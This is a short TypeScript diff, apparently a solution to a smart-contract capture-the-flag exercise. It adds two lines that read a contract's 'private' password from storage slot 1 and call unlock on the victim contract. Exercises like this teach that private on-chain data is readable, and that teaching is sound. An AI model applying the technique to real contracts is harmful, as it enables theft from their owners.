@@ -8,6 +8,8 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+  let password: any = await waffle.provider.getStorageAt(victim.address, 1);
+  await victim.unlock(password);
 };
 
 export default helper;
